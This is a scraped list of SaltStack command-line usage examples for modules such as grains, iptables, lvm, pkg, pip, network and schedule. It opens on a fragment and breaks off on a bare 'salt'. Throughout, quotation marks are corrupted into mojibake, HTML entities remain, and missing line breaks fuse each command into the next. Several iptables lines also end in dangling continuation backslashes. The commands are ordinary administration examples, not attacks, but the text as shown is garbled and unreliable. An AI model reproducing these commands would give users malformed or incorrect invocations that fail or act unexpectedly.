/etc/motd args=â€[â€˜cheese=spamâ€™,â€™spam=cheeseâ€™]â€salt â€˜*â€™ gem.install vagrantsalt â€˜*â€™ gem.listsalt â€˜*â€™ gem.sources_add http://rubygems.org/salt â€˜*â€™ gem.sources_listsalt â€˜*â€™ gem.sources_remove http://rubygems.org/salt â€˜*â€™ gem.uninstall vagrantsalt â€˜*â€™ gem.update vagrantsalt â€˜*â€™ gem.update_systemsalt â€˜*â€™ grains.append key valsalt â€˜*â€™ grains.delval keysalt â€˜*â€™ grains.filter_by â€˜&#123;Debian: Debheads rule, RedHat: I love my hat&#125;â€™salt â€˜*â€™ grains.filter_by â€˜&#123;A: B, C: &#123;D: &#123;E: F,G: H&#125;&#125;&#125;â€™ â€˜xxxâ€™ â€˜&#123;D: &#123;E: I&#125;,J: K&#125;â€™ â€˜Câ€™salt â€˜*â€™ grains.get pkg:apachesalt â€˜*â€™ grains.get_or_set_hash â€˜django:SECRET_KEYâ€™ 50salt â€˜*â€™ grains.has_value pkg:apachesalt â€˜*â€™ grains.item ossalt â€˜*â€™ grains.item os osrelease oscodenamesalt â€˜*â€™ grains.item host sanitize=Truesalt â€˜*â€™ grains.itemssalt â€˜*â€™ grains.items sanitize=Truesalt â€˜*â€™ grains.lssalt â€˜*â€™ grains.remove key valsalt â€˜*â€™ grains.setval key valsalt â€˜*â€™ grains.setval key â€œ&#123;â€˜sub-key': â€˜valâ€™, â€˜sub-key2â€²: â€˜val2â€²&#125;â€salt â€˜*â€™ grains.setvals â€œ&#123;â€˜key1â€²: â€˜val1â€², â€˜key2â€²: â€˜val2â€²&#125;â€salt â€˜*â€™ group.add foo 3456salt â€˜*â€™ group.adduser foo barsalt â€˜*â€™ group.chgid foo 4376salt â€˜*â€™ group.delete foosalt â€˜*â€™ group.deluser foo barsalt â€˜*â€™ group.getentsalt â€˜*â€™ group.info foosalt â€˜*â€™ group.members foo â€˜user1,user2,user3,â€¦â€™salt â€˜*â€™ grub.confsalt â€˜*â€™ grub.versionsalt â€˜*â€™ hashutil.base64_decodestring â€˜Z2V0IHNhbHRlZA==salt â€˜*â€™ hashutil.base64_encodestring â€˜get saltedâ€™salt â€˜*â€™ hashutil.hmac_signature â€˜get saltedâ€™ â€˜shared secretâ€™ â€˜NS2BvKxFRk+rndAlFbCYIFNVkPtI/3KiIYQw4okNKU8=â€™salt â€˜*â€™ hashutil.md5_digest â€˜get saltedâ€™salt â€˜*â€™ hashutil.sha256_digest â€˜get saltedâ€™salt â€˜*â€™ hashutil.sha512_digest â€˜get saltedâ€™salt â€˜*â€™ hg.archive /path/to/repo output=/tmp/archive.tgz fmt=tgzsalt â€˜*â€™ hg.clone /path/to/repo https://bitbucket.org/birkenfeld/sphinxsalt â€˜*â€™ hg.describe /path/to/reposalt â€˜*â€™ hg.pull /path/to/repo opts=-usalt â€˜*â€™ hg.revision /path/to/repo mybranchsalt â€˜*â€™ hosts.add_host &lt;ip&gt; &lt;alias&gt;salt â€˜*â€™ hosts.get_alias &lt;ip addr&gt;salt â€˜*â€™ hosts.get_ip &lt;hostname&gt;salt â€˜*â€™ hosts.has_pair &lt;ip&gt; &lt;alias&gt;salt â€˜*â€™ hosts.list_hostssalt â€˜*â€™ hosts.rm_host &lt;ip&gt; &lt;alias&gt;salt â€˜*â€™ hosts.set_host &lt;ip&gt; &lt;alias&gt;salt â€˜*â€™ img.bootstrap /srv/salt-images/host.qcow 4096 qcow2salt â€˜*â€™ img.mount_image /tmp/foosalt â€˜*â€™ img.mount_image /tmp/foosalt â€˜*â€™ img.umount_image /mnt/foosalt â€˜*â€™ incron.list_tab rootsalt â€˜*â€™ incron.list_tab rootsalt â€˜*â€™ incron.raw_cron rootsalt â€˜*â€™ incron.raw_system_cronsalt â€˜*â€™ incron.rm_job root /pathsalt â€˜*â€™ incron.rm_job root /pathsalt â€˜*â€™ incron.set_job root â€˜/rootâ€™ â€˜IN_MODIFYâ€™ â€˜echo â€œ$$ $@ $# $% $&amp;â€â€˜salt â€˜*â€™ incron.write_incron_file_verbose root /tmp/new_cronsalt â€˜*â€™ incron.write_cron_file root /tmp/new_cronsalt â€˜*â€™ ini.get_option /path/to/ini section_name option_namesalt â€˜*â€™ ini.get_section /path/to/ini section_namesalt â€˜*â€™ ini.remove_option /path/to/ini section_name option_namesalt â€˜*â€™ ini.remove_section /path/to/ini section_namesalt â€˜*â€™ ini.set_option /path/to/ini â€˜&#123;section_foo: &#123;key: value&#125;&#125;â€™salt â€˜*â€™ ip.apply_network_settingssalt â€˜*â€™ ip.build_bond bond0 mode=balance-albsalt â€˜*â€™ ip.build_interface eth0 eth &lt;settings&gt;salt â€˜*â€™ ip.build_network_settings &lt;settings&gt;salt â€˜*â€™ ip.build_routes eth0 &lt;settings&gt;salt â€˜*â€™ ip.down eth0salt â€˜*â€™ ip.get_bond bond0salt â€˜*â€™ ip.get_interface eth0salt â€˜*â€™ ip.get_network_settingssalt â€˜*â€™ ip.get_routes eth0salt â€˜*â€™ ip.up eth0salt â€˜*â€™ iptables.append filter INPUT \\salt â€˜*â€™ iptables.append filter INPUT \\salt â€˜*â€™ iptables.build_rule match=state \\salt â€˜*â€™ iptables.build_rule filter INPUT command=I position=3 \\salt â€˜*â€™ iptables.build_rule filter INPUT command=A \\salt â€˜*â€™ iptables.build_rule filter INPUT command=A \\salt â€˜*â€™ iptables.build_rule filter INPUT command=A \\salt â€˜*â€™ iptables.build_rule match=state \\salt â€˜*â€™ iptables.build_rule filter INPUT command=I position=3 \\salt â€˜*â€™ iptables.check filter INPUT \\salt â€˜*â€™ iptables.check filter INPUT \\salt â€˜*â€™ iptables.check_chain filter INPUTsalt â€˜*â€™ iptables.check_chain filter INPUT family=ipv6salt â€˜*â€™ iptables.delete filter INPUT position=3salt â€˜*â€™ iptables.delete filter INPUT \\salt â€˜*â€™ iptables.delete filter INPUT position=3 family=ipv6salt â€˜*â€™ iptables.delete filter INPUT \\salt â€˜*â€™ iptables.delete_chain filter CUSTOM_CHAINsalt â€˜*â€™ iptables.delete_chain filter CUSTOM_CHAIN family=ipv6salt â€˜*â€™ iptables.flush filter INPUTsalt â€˜*â€™ iptables.flush filter INPUT family=ipv6salt â€˜*â€™ iptables.get_policy filter INPUTsalt â€˜*â€™ iptables.get_policy filter INPUT family=ipv6salt â€˜*â€™ iptables.get_rulessalt â€˜*â€™ iptables.get_rules family=ipv6salt â€˜*â€™ iptables.get_saved_policy filter INPUTsalt â€˜*â€™ iptables.get_saved_policy filter INPUT \\salt â€˜*â€™ iptables.get_saved_policy filter INPUT family=ipv6salt â€˜*â€™ iptables.get_saved_policy filter INPUT \\salt â€˜*â€™ iptables.get_saved_rulessalt â€˜*â€™ iptables.get_saved_rules family=ipv6salt â€˜*â€™ iptables.insert filter INPUT position=3 \\salt â€˜*â€™ iptables.insert filter INPUT position=3 \\salt â€˜*â€™ iptables.new_chain filter CUSTOM_CHAINsalt â€˜*â€™ iptables.new_chain filter CUSTOM_CHAIN family=ipv6salt â€˜*â€™ iptables.save /etc/sysconfig/iptablessalt â€˜*â€™ iptables.save /etc/sysconfig/iptables family=ipv6salt â€˜*â€™ iptables.set_policy filter INPUT ACCEPTsalt â€˜*â€™ iptables.set_policy filter INPUT ACCEPT family=ipv6salt â€˜*â€™ iptables.versionsalt â€˜*â€™ iptables.version family=ipv6salt â€˜*â€™ key.fingersalt â€˜*â€™ key.finger_mastersalt â€˜*â€™ kmod.availablesalt â€˜*â€™ kmod.check_available kvmsalt â€˜*â€™ kmod.is_loaded kvmsalt â€˜*â€™ kmod.load kvmsalt â€˜*â€™ kmod.lsmodsalt â€˜*â€™ kmod.mod_listsalt â€˜*â€™ kmod.remove kvmsalt â€˜*â€™ locale.avail â€˜en_US.UTF-8â€²salt â€˜*â€™ locale.gen_locale â€˜en_US.UTF-8â€²salt â€˜*â€™ locale.get_localesalt â€˜*â€™ locale.list_availsalt â€˜*â€™ locale.set_locale â€˜en_US.UTF-8â€²salt â€˜*â€™ locate.locatesalt â€˜*â€™ locate.statssalt â€˜*â€™ locate.updatedbsalt â€˜*â€™ locate.versionsalt â€˜*â€™ logrotate.set rotate 2salt â€˜*â€™ logrotate.set /var/log/wtmp rotate 2salt â€˜*â€™ logrotate.show_confsalt â€˜*â€™ lowpkg.file_dict httpdsalt â€˜*â€™ lowpkg.file_dict httpd postfixsalt â€˜*â€™ lowpkg.file_dictsalt â€˜*â€™ lowpkg.file_list httpdsalt â€˜*â€™ lowpkg.file_list httpd postfixsalt â€˜*â€™ lowpkg.file_listsalt â€˜*â€™ lowpkg.list_pkgssalt â€˜*â€™ lowpkg.verifysalt â€˜*â€™ lowpkg.verify httpdsalt â€˜*â€™ lowpkg.verify â€˜httpd postfixâ€™salt â€˜*â€™ lowpkg.verify â€˜httpd postfixâ€™ ignore_types=[â€˜configâ€™,â€™docâ€™]salt â€˜*â€™ lvm.fullversionsalt â€˜*â€™ lvm.lvcreate new_volume_name vg_name size=10Gsalt â€˜*â€™ lvm.lvcreate new_volume_name vg_name extents=100 /dev/sdbsalt â€˜*â€™ lvm.lvcreate new_snapshot vg_name snapshot=volume_name size=3Gsalt â€˜*â€™ lvm.lvdisplaysalt â€˜*â€™ lvm.lvdisplay /dev/vg_myserver/rootsalt â€˜*â€™ lvm.lvremove lvname vgname force=Truesalt â€˜*â€™ lvm.pvdisplaysalt â€˜*â€™ lvm.pvdisplay /dev/md0salt â€˜*â€™ lvm.versionsalt â€˜*â€™ lvm.vgdisplaysalt â€˜*â€™ lvm.vgdisplay nova-volumessalt â€˜*â€™ match.compound â€˜L@cheese,foo and *â€™salt â€˜*â€™ match.data â€˜spam:eggsâ€™salt â€˜*â€™ match.filter_by â€˜&#123;foo*: Foo!, bar*: Bar!&#125;â€™ minion_id=bar03salt â€˜*â€™ match.glob â€˜*â€™salt â€˜*â€™ match.grain â€˜os:Ubuntuâ€™salt â€˜*â€™ match.grain â€˜ipv6|2001:db8::ff00:42:8329â€² delimiter=â€™|â€™salt â€˜*â€™ match.grain_pcre â€˜os:Fedo.*â€™salt â€˜*â€™ match.grain_pcre â€˜ipv6|2001:.*â€™ delimiter=â€™|â€™salt â€˜*â€™ match.ipcidr â€˜192.168.44.0/24â€²salt â€˜*â€™ match.list â€˜server1,server2â€²salt â€˜*â€™ match.pcre â€˜.*â€™salt â€˜*â€™ match.pillar â€˜cheese:fooâ€™salt â€˜*â€™ match.pillar â€˜clone_url|https://github.com/saltstack/salt.gitâ€™ delimiter=â€™|â€™salt â€˜*â€™ mine.delete â€˜network.interfacesâ€™salt â€˜*â€™ mine.flushsalt â€˜*â€™ mine.get â€˜*â€™ network.interfacessalt â€˜*â€™ mine.get â€˜os:Fedoraâ€™ network.interfaces grainsalt â€˜*â€™ mine.get â€˜os:Fedora and S@192.168.5.0/24â€² network.ipaddrs compoundsalt â€˜*â€™ mine.get_dockersalt â€˜*â€™ mine.get_docker interfaces=â€™eth0â€²salt â€˜*â€™ mine.get_docker interfaces='[â€œeth0â€³, â€œeth1â€³]â€™salt â€˜*â€™ mine.get_docker cidrs=â€™107.170.147.0/24â€²salt â€˜*â€™ mine.get_docker cidrs='[â€œ107.170.147.0/24â€³, â€œ172.17.42.0/24â€³]â€™salt â€˜*â€™ mine.get_docker interfaces='[â€œeth0â€³, â€œeth1â€³]â€™ cidrs='[â€œ107.170.147.0/24â€³, â€œ172.17.42.0/24â€³]â€™salt â€˜*â€™ mine.send network.interfaces eth0salt â€˜*â€™ mine.updatesalt â€˜*â€™ modjk.bulk_activate node1,node2,node3 loadbalancer1salt â€˜*â€™ modjk.bulk_activate node1,node2,node3 loadbalancer1 other-profilesalt â€˜*â€™ modjk.bulk_activate [â€œnode1â€³,â€node2â€³,â€node3â€³] loadbalancer1salt â€˜*â€™ modjk.bulk_activate [â€œnode1â€³,â€node2â€³,â€node3â€³] loadbalancer1 other-profilesalt â€˜*â€™ modjk.bulk_disable node1,node2,node3 loadbalancer1salt â€˜*â€™ modjk.bulk_disable node1,node2,node3 loadbalancer1 other-profilesalt â€˜*â€™ modjk.bulk_disable [â€œnode1â€³,â€node2â€³,â€node3â€³] loadbalancer1salt â€˜*â€™ modjk.bulk_disable [â€œnode1â€³,â€node2â€³,â€node3â€³] loadbalancer1 other-profilesalt â€˜*â€™ modjk.bulk_recover node1,node2,node3 loadbalancer1salt â€˜*â€™ modjk.bulk_recover node1,node2,node3 loadbalancer1 other-profilesalt â€˜*â€™ modjk.bulk_recover [â€œnode1â€³,â€node2â€³,â€node3â€³] loadbalancer1salt â€˜*â€™ modjk.bulk_recover [â€œnode1â€³,â€node2â€³,â€node3â€³] loadbalancer1 other-profilesalt â€˜*â€™ modjk.bulk_stop node1,node2,node3 loadbalancer1salt â€˜*â€™ modjk.bulk_stop node1,node2,node3 loadbalancer1 other-profilesalt â€˜*â€™ modjk.bulk_stop [â€œnode1â€³,â€node2â€³,â€node3â€³] loadbalancer1salt â€˜*â€™ modjk.bulk_stop [â€œnode1â€³,â€node2â€³,â€node3â€³] loadbalancer1 other-profilesalt â€˜*â€™ modjk.dump_configsalt â€˜*â€™ modjk.dump_config other-profilesalt â€˜*â€™ modjk.get_runningsalt â€˜*â€™ modjk.get_running other-profilesalt â€˜*â€™ modjk.lb_edit loadbalancer1 â€œ&#123;â€˜vlr': 1, â€˜vlt': 60&#125;â€salt â€˜*â€™ modjk.lb_edit loadbalancer1 â€œ&#123;â€˜vlr': 1, â€˜vlt': 60&#125;â€ other-profilesalt â€˜*â€™ modjk.list_configured_members loadbalancer1salt â€˜*â€™ modjk.list_configured_members loadbalancer1 other-profilesalt â€˜*â€™ modjk.recover_all loadbalancer1salt â€˜*â€™ modjk.recover_all loadbalancer1 other-profilesalt â€˜*â€™ modjk.reset_stats loadbalancer1salt â€˜*â€™ modjk.reset_stats loadbalancer1 other-profilesalt â€˜*â€™ modjk.versionsalt â€˜*â€™ modjk.version other-profilesalt â€˜*â€™ modjk.worker_activate node1 loadbalancer1salt â€˜*â€™ modjk.worker_activate node1 loadbalancer1 other-profilesalt â€˜*â€™ modjk.worker_disable node1 loadbalancer1salt â€˜*â€™ modjk.worker_disable node1 loadbalancer1 other-profilesalt â€˜*â€™ modjk.worker_edit node1 loadbalancer1 â€œ&#123;â€˜vwf': 500, â€˜vwd': 60&#125;â€salt â€˜*â€™ modjk.worker_edit node1 loadbalancer1 â€œ&#123;â€˜vwf': 500, â€˜vwd': 60&#125;â€ other-profilesalt â€˜*â€™ modjk.worker_recover node1 loadbalancer1salt â€˜*â€™ modjk.worker_recover node1 loadbalancer1 other-profilesalt â€˜*â€™ modjk.worker_status node1salt â€˜*â€™ modjk.worker_status node1 other-profilesalt â€˜*â€™ modjk.worker_activate node1 loadbalancer1salt â€˜*â€™ modjk.worker_activate node1 loadbalancer1 other-profilesalt â€˜*â€™ modjk.workerssalt â€˜*â€™ modjk.workers other-profilesalt â€˜*â€™ mount.activesalt â€˜*â€™ mount.fstabsalt â€˜*â€™ mount.is_fuse_exec sshfssalt â€˜*â€™ mount.is_mounted /mnt/sharesalt â€˜*â€™ mount.mount /mnt/foo /dev/sdz1 Truesalt â€˜*â€™ mount.remount /mnt/foo /dev/sdz1 Truesalt â€˜*â€™ mount.rm_fstab /mnt/foosalt â€˜*â€™ mount.set_fstab /mnt/foo /dev/sdz1 ext4salt â€˜*â€™ mount.swapoff /root/swapfilesalt â€˜*â€™ mount.swapon /root/swapfilesalt â€˜*â€™ mount.swapssalt â€˜*â€™ mount.umount /mnt/foosalt â€˜*â€™ network.active_tcpsalt â€˜*â€™ network.arpsalt â€˜*â€™ network.connect archlinux.org 80salt â€˜*â€™ network.connect archlinux.org 80 timeout=3salt â€˜*â€™ network.connect archlinux.org 80 timeout=3 family=ipv4salt â€˜*â€™ network.connect google-public-dns-a.google.com port=53 proto=udp timeout=3salt â€˜*â€™ network.dig archlinux.orgsalt â€˜*â€™ network.get_hostnamesalt â€˜*â€™ network.hw_addr eth0salt â€˜*â€™ network.hw_addr eth0salt â€˜*â€™ network.in_subnet 10.0.0.0/16salt â€˜*â€™ network.interface eth0salt â€˜*â€™ network.interface_ip eth0salt â€˜*â€™ network.interfacessalt â€˜*â€™ network.ip_addrssalt â€˜*â€™ network.ip_addrs6salt â€˜*â€™ network.ip_addrssalt â€˜*â€™ network.ip_addrs6salt â€˜*â€™ network.is_loopback 127.0.0.1salt â€˜*â€™ network.is_private 10.0.0.3salt â€˜*â€™ network.mod_hostname master.saltstack.comsalt â€˜*â€™ network.netstatsalt â€˜*â€™ network.ping archlinux.orgsalt â€˜*â€™ network.subnetssalt â€˜*â€™ network.traceroute archlinux.orgsalt â€˜*â€™ pillar.itemssalt â€˜*â€™ pillar.ext â€˜&#123;libvirt: _&#125;â€™salt â€˜*â€™ pillar.get pkg:apachesalt â€˜*â€™ pillar.item foosalt â€˜*â€™ pillar.item foo bar bazsalt â€˜*â€™ pillar.itemssalt â€˜*â€™ pillar.rawsalt â€˜*â€™ pillar.raw key=â€™rolesâ€™salt â€˜*â€™ pip.freeze /home/code/path/to/virtualenv/salt â€˜*â€™ pip.install &lt;package name&gt;,&lt;package2 name&gt;salt â€˜*â€™ pip.install requirements=/path/to/requirements.txtsalt â€˜*â€™ pip.install &lt;package name&gt; bin_env=/path/to/virtualenvsalt â€˜*â€™ pip.install &lt;package name&gt; bin_env=/path/to/pip_binsalt â€˜*â€™ pip.install markdown,django editable=git+https://github.com/worldcompany/djangoembed.git#egg=djangoembed upgrade=True no_deps=Truesalt â€˜*â€™ pip.list saltsalt â€˜*â€™ pip.uninstall &lt;package name&gt;,&lt;package2 name&gt;salt â€˜*â€™ pip.uninstall requirements=/path/to/requirements.txtsalt â€˜*â€™ pip.uninstall &lt;package name&gt; bin_env=/path/to/virtualenvsalt â€˜*â€™ pip.uninstall &lt;package name&gt; bin_env=/path/to/pip_binsalt â€˜*â€™ pip.versionsalt â€˜*â€™ pkg.latest_version &lt;package name&gt;salt â€˜*â€™ pkg.latest_version &lt;package name&gt; fromrepo=epel-testingsalt â€˜*â€™ pkg.latest_version &lt;package name&gt; disableexcludes=mainsalt â€˜*â€™ pkg.latest_version &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; â€¦salt â€˜*â€™ pkg.check_db &lt;package1&gt; &lt;package2&gt; &lt;package3&gt;salt â€˜*â€™ pkg.check_db &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; fromrepo=epel-testingsalt â€˜*â€™ pkg.check_db &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; disableexcludes=mainsalt â€˜*â€™ pkg.clean_metadatasalt â€˜*â€™ pkg.del_repo myreposalt â€˜*â€™ pkg.del_repo myrepo basedir=/path/to/dirsalt â€˜*â€™ pkg.file_list httpdsalt â€˜*â€™ pkg.file_list httpd postfixsalt â€˜*â€™ pkg.file_listsalt â€˜*â€™ pkg.file_list httpdsalt â€˜*â€™ pkg.file_list httpd postfixsalt â€˜*â€™ pkg.file_listsalt â€˜*â€™ pkg.get_locked_packagessalt â€˜*â€™ pkg.get_repo myreposalt â€˜*â€™ pkg.get_repo myrepo basedir=/path/to/dirsalt â€˜*â€™ pkg.group_diff â€˜Perl Supportâ€™salt â€˜*â€™ pkg.group_info â€˜Perl Supportâ€™salt â€˜*â€™ pkg.group_install â€˜Group 1â€²salt â€˜*â€™ pkg.group_install â€˜Group 1,Group 2â€²salt â€˜*â€™ pkg.group_install â€˜[â€œGroup 1â€³, â€œGroup 2â€³]â€™salt â€˜*â€™ pkg.group_install â€˜My Groupâ€™ skip=â€™foo,barâ€™salt â€˜*â€™ pkg.group_install â€˜My Groupâ€™ skip='[â€œfooâ€, â€œbarâ€]â€™salt â€˜*â€™ pkg.group_install â€˜My Groupâ€™ include=â€™foo,barâ€™salt â€˜*â€™ pkg.group_install â€˜My Groupâ€™ include='[â€œfooâ€, â€œbarâ€]â€™salt â€˜*â€™ pkg.group_listsalt â€˜*â€™ pkg.hold &lt;package name&gt;salt â€˜*â€™ pkg.hold pkgs='[â€œfooâ€, â€œbarâ€]â€™salt â€˜*â€™ pkg.install &lt;package name&gt;salt â€˜*â€™ pkg.install pkgs='[â€œfooâ€, â€œbarâ€]â€™salt â€˜*â€™ pkg.install pkgs='[â€œfooâ€, &#123;â€œbarâ€: â€œ1.2.3-4.el5â€³&#125;]â€™salt â€˜*â€™ pkg.install sources='[&#123;â€œfooâ€: â€œsalt://foo.rpmâ€&#125;, &#123;â€œbarâ€: â€œsalt://bar.rpmâ€&#125;]â€™salt â€˜*â€™ pkg.latest_version &lt;package name&gt;salt â€˜*â€™ pkg.latest_version &lt;package name&gt; fromrepo=epel-testingsalt â€˜*â€™ pkg.latest_version &lt;package name&gt; disableexcludes=mainsalt â€˜*â€™ pkg.latest_version &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; â€¦salt â€˜*â€™ pkg.list_pkgssalt â€˜*â€™ pkg.list_repo_pkgssalt â€˜*â€™ pkg.list_repo_pkgs foo bar bazsalt â€˜*â€™ pkg.list_repo_pkgs â€˜samba4*â€™ fromrepo=base,updatessalt â€˜*â€™ pkg.list_repossalt â€˜*â€™ pkg.list_upgradessalt â€˜*â€™ pkg.mod_repo reponame enabled=1 gpgcheck=1salt â€˜*â€™ pkg.mod_repo reponame basedir=/path/to/dir enabled=1salt â€˜*â€™ pkg.mod_repo reponame baseurl= mirrorlist=http://host.com/salt â€˜*â€™ pkg.normalize_name zsh.x86_64salt â€˜*â€™ pkg.owner /usr/bin/apachectlsalt â€˜*â€™ pkg.owner /usr/bin/apachectl /etc/httpd/conf/httpd.confsalt â€˜*â€™ pkg.purge &lt;package name&gt;salt â€˜*â€™ pkg.purge &lt;package1&gt;,&lt;package2&gt;,&lt;package3&gt;salt â€˜*â€™ pkg.purge pkgs='[â€œfooâ€, â€œbarâ€]â€™salt â€˜*â€™ pkg.refresh_dbsalt â€˜*â€™ pkg.remove &lt;package name&gt;salt â€˜*â€™ pkg.remove &lt;package1&gt;,&lt;package2&gt;,&lt;package3&gt;salt â€˜*â€™ pkg.remove pkgs='[â€œfooâ€, â€œbarâ€]â€™salt â€˜*â€™ pkg.unhold &lt;package name&gt;salt â€˜*â€™ pkg.unhold pkgs='[â€œfooâ€, â€œbarâ€]â€™salt â€˜*â€™ pkg.upgradesalt â€˜*â€™ pkg.upgrade_available &lt;package name&gt;salt â€˜*â€™ pkg.verifysalt â€˜*â€™ pkg.verify httpdsalt â€˜*â€™ pkg.verify â€˜httpd postfixâ€™salt â€˜*â€™ pkg.verify â€˜httpd postfixâ€™ ignore_types=[â€˜configâ€™,â€™docâ€™]salt â€˜*â€™ pkg.version &lt;package name&gt;salt â€˜*â€™ pkg.version &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; â€¦salt â€˜*â€™ pkg_resource.add_pkg â€˜&#123;&#125;â€™ bind 9salt â€˜*â€™ pkg_resource.check_extra_requirements &lt;pkgname&gt; &lt;extra_requirements&gt;salt â€˜*â€™ pkg_resource.pack_sources â€˜[&#123;â€œfooâ€: â€œsalt://foo.rpmâ€&#125;, &#123;â€œbarâ€: â€œsalt://bar.rpmâ€&#125;]â€™salt â€˜*â€™ pkg_resource.parse_targetssalt â€˜*â€™ pkg_resource.sort_pkglist â€˜[â€œ3.45â€³, â€œ2.13â€]â€™salt â€˜*â€™ pkg_resource.stringify â€˜vim: 7.127â€²salt â€˜*â€™ pkg_resource.version vimsalt â€˜*â€™ pkg_resource.version foo bar bazsalt â€˜*â€™ pkg_resource.version â€˜python*â€™salt â€˜*â€™ pkg_resource.version_clean &lt;version_string&gt;salt â€˜*â€™ publish.full_data test.kwarg arg=â€™cheese=spamâ€™salt â€˜*â€™ publish.publish test.kwarg arg=â€™cheese=spamâ€™salt â€˜*â€™ pyenv.defaultsalt â€˜*â€™ pyenv.default 2.0.0-p0salt â€˜*â€™ pyenv.do â€˜gem list bundlerâ€™salt â€˜*â€™ pyenv.do â€˜gem list bundlerâ€™ deploysalt â€˜*â€™ pyenv.do_with_python 2.0.0-p0 â€˜gem list bundlerâ€™salt â€˜*â€™ pyenv.do_with_python 2.0.0-p0 â€˜gem list bundlerâ€™ deploysalt â€˜*â€™ pyenv.installsalt â€˜*â€™ pyenv.install_python 2.0.0-p0salt â€˜*â€™ pyenv.is_installedsalt â€˜*â€™ pyenv.listsalt â€˜*â€™ pyenv.rehashsalt â€˜*â€™ pyenv.uninstall_python 2.0.0-p0salt â€˜*â€™ pyenv.updatesalt â€˜*â€™ pyenv.versionssalt â€˜*â€™ raid.assemble /dev/md0 [â€˜/dev/xvddâ€™, â€˜/dev/xvdeâ€™]salt â€˜*â€™ raid.create /dev/md0 level=1 chunk=256 devices=â€[â€˜/dev/xvddâ€™, â€˜/dev/xvdeâ€™]â€ test_mode=Truesalt â€˜*â€™ raid.detail /dev/md0salt â€˜*â€™ raid.destroy /dev/md0salt â€˜*â€™ raid.detail â€˜/dev/md0â€²salt â€˜*â€™ raid.listsalt â€˜*â€™ raid.save_configsalt â€˜*â€™ random.get_str 128salt â€˜*â€™ random.hash â€˜I am a stringâ€™ md5salt â€˜*â€™ random.shadow_hash â€˜My5alTâ€™ â€˜MyP@asswdâ€™ md5salt â€˜*â€™ random.str_encode â€˜I am a new stringâ€™ base64salt â€˜*â€™ rbenv.defaultsalt â€˜*â€™ rbenv.default 2.0.0-p0salt â€˜*â€™ rbenv.do â€˜gem list bundlerâ€™salt â€˜*â€™ rbenv.do â€˜gem list bundlerâ€™ deploysalt â€˜*â€™ rbenv.do_with_ruby 2.0.0-p0 â€˜gem list bundlerâ€™salt â€˜*â€™ rbenv.do_with_ruby 2.0.0-p0 â€˜gem list bundlerâ€™ deploysalt â€˜*â€™ rbenv.installsalt â€˜*â€™ rbenv.install_ruby 2.0.0-p0salt â€˜*â€™ rbenv.is_installedsalt â€˜*â€™ rbenv.listsalt â€˜*â€™ rbenv.rehashsalt â€˜*â€™ rbenv.uninstall_ruby 2.0.0-p0salt â€˜*â€™ rbenv.updatesalt â€˜*â€™ rbenv.versionssalt â€˜*â€™ ret.get_fun mysql network.interfacessalt â€˜*â€™ ret.get_jid redis 20421104181954700505salt â€˜*â€™ ret.get_jids mysqlsalt â€˜*â€™ ret.get_minions mysqlsalt â€˜*â€™ rsync.configsalt â€˜*â€™ rsync.rsync &#123;src&#125; &#123;dst&#125; &#123;delete=True&#125; &#123;update=True&#125; &#123;passwordfile=/etc/pass.crt&#125; &#123;exclude=xx&#125;salt â€˜*â€™ rsync.rsync &#123;src&#125; &#123;dst&#125; &#123;delete=True&#125; &#123;excludefrom=/xx.ini&#125;salt â€˜*â€™ rsync.versionsalt â€˜*â€™ rvm.do 2.0.0 &lt;command&gt;salt â€˜*â€™ rvm.gemset_copy foobar bazquosalt â€˜*â€™ rvm.gemset_create 2.0.0 foobarsalt â€˜*â€™ rvm.gemset_delete 2.0.0 foobarsalt â€˜*â€™ rvm.gemset_empty 2.0.0 foobarsalt â€˜*â€™ rvm.gemset_listsalt â€˜*â€™ rvm.gemset_list_allsalt â€˜*â€™ rvm.getsalt â€˜*â€™ rvm.installsalt â€˜*â€™ rvm.install_ruby 1.9.3-p385salt â€˜*â€™ rvm.is_installedsalt â€˜*â€™ rvm.listsalt â€˜*â€™ rvm.reinstall_ruby 1.9.3-p385salt â€˜*â€™ rvm.rubygems 2.0.0 1.8.24salt â€˜*â€™ rvm.set_default 2.0.0salt â€˜*â€™ rvm.wrapper &lt;ruby_string&gt; &lt;wrapper_prefix&gt;salt â€˜*â€™ saltutil.clear_cachesalt â€˜*â€™ saltutil.cmdsalt â€˜*â€™ saltutil.cmdsalt â€˜*â€™ saltutil.find_cached_job &lt;job id&gt;salt â€˜*â€™ saltutil.find_job &lt;job id&gt;salt â€˜*â€™ saltutil.is_running state.highstatesalt â€˜*â€™ saltutil.kill_job &lt;job id&gt;salt â€˜*â€™ saltutil.mmodule base test.pingsalt â€˜*â€™ saltutil.refresh_modulessalt â€˜*â€™ saltutil.refresh_pillarsalt â€˜*â€™ saltutil.regen_keyssalt â€˜*â€™ saltutil.revoke_authsalt â€˜*â€™ saltutil.runner jobs.list_jobssalt â€˜*â€™ saltutil.runningsalt â€˜*â€™ saltutil.signal_job &lt;job id&gt; 15salt â€˜*â€™ saltutil.sync_allsalt â€˜*â€™ saltutil.sync_grainssalt â€˜*â€™ saltutil.sync_modulessalt â€˜*â€™ saltutil.sync_outputterssalt â€˜*â€™ saltutil.sync_rendererssalt â€˜*â€™ saltutil.sync_returnerssalt â€˜*â€™ saltutil.sync_statessalt â€˜*â€™ saltutil.sync_utilssalt â€˜*â€™ saltutil.term_job &lt;job id&gt;salt â€˜*â€™ saltutil.updatesalt â€˜*â€™ saltutil.update 0.10.3salt â€˜*â€™ saltutil.wheel key.accept match=jerrysalt â€˜*â€™ schedule.add job1 function=â€™test.pingâ€™ seconds=3600salt â€˜*â€™ schedule.build_schedule_item job1 function=â€™test.pingâ€™ seconds=3600salt â€˜*â€™ schedule.delete job1salt â€˜*â€™ schedule.disablesalt â€˜*â€™ schedule.disable_job job1salt â€˜*â€™ schedule.enablesalt â€˜*â€™ schedule.enable_job job1salt â€˜*â€™ schedule.listsalt â€˜*â€™ schedule.list show_all=Truesalt â€˜*â€™ schedule.modify job1 function=â€™test.pingâ€™ seconds=3600salt â€˜*â€™ schedule.purgesalt â€˜*â€™ schedule.reloadsalt â€˜*â€™ schedule.run_job job1salt â€˜*â€™ schedule.run_job job1 force=Truesalt â€˜*â€™ schedule.savesalt â€˜minionâ€™ seed.apply path id [config=config_data] \\salt â€˜minionâ€™ seed.mkconfig [config=config_data] [tmp=tmp_dir] \\salt â€˜*â€™ serverdensity_device.create lamasalt â€˜*â€™ serverdensity_device.create rich_lama group=lama_band installedRAM=32768salt 